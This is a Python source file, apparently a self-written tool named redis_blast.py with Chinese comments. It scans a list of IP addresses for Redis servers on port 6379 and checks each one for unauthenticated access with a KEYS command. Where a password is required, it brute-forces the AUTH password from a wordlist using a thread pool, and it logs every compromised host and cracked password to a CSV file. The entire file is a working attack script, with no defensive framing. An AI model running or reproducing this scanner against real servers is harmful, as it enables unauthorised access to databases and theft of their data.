#!/usr/bin/env python
# -*- coding: UTF-8 -*-
"""
@Project ：pythonProject1 
@File    ：redis_blast.py
@Author  ：林香
@Date    ：2023/7/17 16:00 
@脚本说明：
"""

import socket
from concurrent.futures import ThreadPoolExecutor
import time


class Redis:
    def __init__(self):
        self.ips = []
        self.passwds = []
        self.filename = f"scan_redis_{int(time.time())}.csv"

    # 加载密码ip和passwd文件
    def load_passwords(self):
        with open("./conf/redis_ip.txt", "r") as f:
            self.ips = f.readlines()
        with open("./conf/redis_passwd.txt", "r") as f:
            self.passwds = f.readlines()

    # redis如果有密码尝试爆破
    def conn(self, ip, w):
        w = w.strip()
        w_len = len(w)
        s = socket.socket()
        try:
            s.connect((ip, 6379))
            s.send(f"*2\r\n$4\r\nauth\r\n${str(w_len)}\r\n{w}\r\n".encode())
            resp = s.recv(1024).decode()

            if "ERR" in resp or "WRONGPASS" in resp:
                pass
            else:
                print(f"[+]  爆破成功:{ip},密码：{w}")
                with open(f"./scan/{self.filename}", "a", encoding="utf-8") as f:
                    f.write(f"{ip},{w}\n")
        except Exception as e:
            pass

    def crack_redis(self, ip):
        ip = ip.strip()
        s = socket.socket()
        try:
            s.connect((ip, 6379))
            s.send("*2\r\n$4\r\nkeys\r\n$1\r\n*\r\n".encode())
            resp = s.recv(1024).decode()

            if "Authentication" in resp:
                with ThreadPoolExecutor() as executor:
                    for w in self.passwds:
                        executor.submit(self.conn, ip, w)
            elif "*" in resp:
                print(f"[+]  登录成功:{ip}")
                with open(f"./scan/{self.filename}", "a", encoding="utf-8") as f:
                    f.write(f"{ip}\n")
        except Exception as e:
            pass

        s.close()


def main():
    print("正在进行redis扫描^_^.........")
    # 实例化类
    cracker = Redis()
    cracker.load_passwords()
    # 创建线程池，在cracker.ips里的每个IP调用 executor.submit(cracker.crack_redis, ip),
    # 将爆破任务提交给线程池
    with ThreadPoolExecutor() as executor:
        for ip in cracker.ips:
            executor.submit(cracker.crack_redis, ip)


if __name__ == "__main__":
    main()
